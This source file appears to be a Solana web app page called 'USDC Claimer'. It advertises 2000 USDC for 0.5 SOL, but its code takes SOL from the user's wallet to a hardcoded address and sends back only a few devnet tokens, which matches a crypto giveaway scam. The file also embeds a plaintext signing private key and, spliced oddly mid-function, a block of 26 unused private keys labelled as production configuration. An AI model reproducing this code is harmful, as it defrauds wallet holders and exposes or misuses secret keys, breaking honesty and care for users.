/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4zpxGLmFeQWt7PLF4ZaugDQFVDqp51MrtGYzADk6CU9Bm56XwAVgqcmNChR8z1YapStCkPMgxgQY8dGG17K71Ntg"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "61mJauWu45m1GMY5fHL4aq8MTHpKKWZK3yoV8zxfUyNwznCfGdWu1xe6io1JHMbHs4vGu8phTLagpGDUU3edmrMN",
  "key1": "3LUpSeZqeNYUQMXcttEmaT4wNSn1dTiQfghebiiERfpmXdhCuv1YmPWd926agiBRKbAvd1UjBF2euZZniGJJYgmU",
  "key2": "43T3QKbvxRmYHbJzfYMFvzeyAKaGy7qtV9zpm71f1ww68CQzWuMKqwQg7RDpQ8SjwhzaSa2Ckqyzumhsip1purbv",
  "key3": "4CVYBtYPrj33N4zMWNVc7uHg2KntTrrqVfNZJeuT1DHAedmYL3cSxsobGctKSTt5WYDDXYVSv2FSdemFq3cD6RCy",
  "key4": "5qbUCCqGG4FqKbFKbJc7ZKf2yJn4ELGWigyt6tyQapBbFXi5ixNRdfm7yTbueShKMnSVL8Bee5J8E6oXQXBtoYEP",
  "key5": "4HDcPnZuxEUx2yzWtDyjtPVJnnQLaRVTaq1qY7M266CiNssJpXfqrnc3DWyC8fDDvvM45vYdCJHXav2H1D3aFJwJ",
  "key6": "4QZ9bebAmWiwaPTbzSxw89LotqvorGcLKdokdsMKqbN1sPXy9WFxwyd6ovBrCRJEGZmpxL7hAyB3oPw9MwsAvupg",
  "key7": "5rAhVzeQ5E6STbF6MJCUB6biQSjRqK6RsexMpBZqxj7Rbi6CoMSdqijG6ESQ93BJooAjAQ1z28itwoqMwHo2iKkp",
  "key8": "3HdVPbggivfvdN2uMiYmg8a7LNfBbQYa96NWEyKBDrnYhgD5D2mGyDdm3DEM7uZygnaLnMC4c68F2T6XQTpDEtQG",
  "key9": "5owEBHcrQr4QPKUkQXH2oXycfDpeETSWU72727PW3ASotMvrYkAicbGNGXxMpx4Htzw1G9SxZsULuSWag7hcKdtt",
  "key10": "QLiLNpWBjLvQkJLEXLm8fbvwrVYmha7Rmr2BfT2wqqxXBCkQkNE5W7w9Qn15vthy3uQvmoaZrS8bKWn2pg1vZaC",
  "key11": "SPLMxTitUNLVRjpwF7sUSEhb9Jv5yUzhHUZ5n3HhhTrjjEeGunWuyXMFdeBZmutBd7dhm8jT8D8ve4dvHiEmH3v",
  "key12": "2PN2iEMsFRwGF1H7sRvQYvwqDfdzj4rAhCrvsxG1Wp84Vfg7E5gwRMKjVDb5hACbyNidV1xyKf5r1C1DPS4FDvbe",
  "key13": "56BynJHqPzAqoShHt7LErgG63wNi4VvMxkCxTU5hBWBrY6iu2VeSwhxwox4ESngp6HzmtVu63oYZa9fbnB6Tjhhy",
  "key14": "5uA6wQbcdPsdiyefvWCX5A1Gj8qFpj4A813tbvKZWiYzbznCoC887UdeuGoEe6atgaFDQ6AdMMuQgUtuyJjrT5pt",
  "key15": "4DukNLg2cmTc9FPNCdT7QBEfEPuxhu9yyP2HfamgWjvDAVPG5bXq5T4eKSTyH9pWV5F2nec59TWEEykvtCjy2EBG",
  "key16": "4zQuaEusY94PAefcZQh5Jy4R7ex3nokfWQSARKtdBTya5uzczwC4BpSBdBJCRKiEKNUgehEBfLCSyJqAMUzVKSZV",
  "key17": "525TZZoUXSvwDn3qQTK3Tj9fEWiGaFYUkmeheohxMS2Y8e4aDnwzgq7e4C7D9Fq4LofK32bXDVWfen2H4vJe7ohw",
  "key18": "33L7jNZ5KzPxbsPLwwczi2aPzgsFjtmAQsd8zxUqHNFHCPf9zztiYERPvhaDN8vcEw8UqtcNVbQC4w22Ra2z2MNX",
  "key19": "5Lz8539u4RnMYv5rjDcoWdZJF8xsRjzYvYKCaaLWodXJMJUUvPtM8Vdeh9utdjBRzbpexj1oLrPtCsDQfyUFKDBQ",
  "key20": "2giC2Gzo9a1PRKQomzVLEBfWPFmKLUSDU64fmVhnSqWYB2jKFnh9pT59S6bZGEdkgZ4dbFkTt4jMGoDirgBMaFpq",
  "key21": "633JUuMaoE3kvmVzT2VsGChhdpSo8a9Mt1SbQLuwo85MyVNf8kntiiMdobUxjJch4no7qE8rZXohqdp7erWCE3Rh",
  "key22": "hRYqjMnfFfJXr8v6E4h1ZLtLb5mXRPAPQvkMQgJouzCLz966hQWFE7HKBQrKEgWaXh2L4VqAFqcddpUrtoMM7cA",
  "key23": "4DWaVqqqfxadf1xRF3hFidXKXKt3PBjd1q3wqDmtfcgxExnpFw4z7JiBD3FTLcVRr4ePfKCLXwjqcZhyuwRaK2N7",
  "key24": "3hgatu8rqKny3SC4Ai4bDYU7Tep5vX4zHtZkauuFMsExthn6kAnQP6BVtzFYig94PyHLvvotQPHcov1HE78aZpHF",
  "key25": "64XwcoPpDFDj3obQFBAakkpbFGVVjEDSpPizAzbhjVTeDP6rGLNVWbb9WUqu7MnauH4ubsm9ZVvZVpd79FmV6yXr"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
